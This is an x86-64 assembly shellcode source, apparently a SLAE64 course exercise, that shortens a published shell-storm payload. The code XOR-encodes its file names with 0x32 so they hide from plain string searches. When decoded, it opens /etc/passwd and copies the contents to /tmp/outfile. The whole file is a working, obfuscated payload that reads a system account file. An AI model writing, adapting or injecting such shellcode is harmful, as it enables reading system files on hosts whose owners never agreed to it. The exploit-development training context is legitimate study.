; ===================================================================
; Optimized version of shellcode at:
; http://shell-storm.org/shellcode/files/shellcode-867.php
; Author: SLAE64-1351 (Keyman)
; Date: 14/09/2014
;
; Length: 105 bytes (got shorter by 13 bytes)
;
; What's new is that some optimalization was performed on the
; original code which left some space to do a basic decoding of the
; file names. Each byte (except the first one) was xor'ed with the
; value 0x32. The decoder part xor's each byte (except the first)
; with this very same value.
;
; ===================================================================

section .text
global _start

_start:
        xor rsi, rsi
        jmp string_1
cont_1:
        pop rdi

        ; decode

        push 24
        pop rcx
decode:
        xor byte [rdi+rcx], 0x32
        loop decode

        sub byte [rdi+11], 0x41         ; set last byte to 0x00
        sub byte [rdi+24], 0x41         ; set last byte to 0x00

        ; open (1)

        push 2
        pop rax
        syscall

        push rax
        pop r14             ; source

        ; open (2)

        add rdi, 12
        push 0x66
        pop rsi
        push 2
        pop rax
        syscall

        push rax
        pop r15             ; destination

        ; read

        xor rax, rax
        push r14
        pop rdi
        push rsp
        pop rsi
        mov dx, 0xFFFF
        syscall

        ; write

        push rax
        pop rdx

        push r15
        pop rdi

        push 1
        pop rax
        syscall

        ; exit

        push 60
        pop rax
        syscall

string_1:
    call cont_1
    ; first byte stays the original value
    s_1: db 0x2F, 0x57, 0x46, 0x51, 0x1D, 0x42, 0x53, 0x41, 0x41, 0x45, 0x56, 0x73, 0x1D, 0x46, 0x5F, 0x42, 0x1D, 0x5D, 0x47, 0x46, 0x54, 0x5B, 0x5E, 0x57, 0x73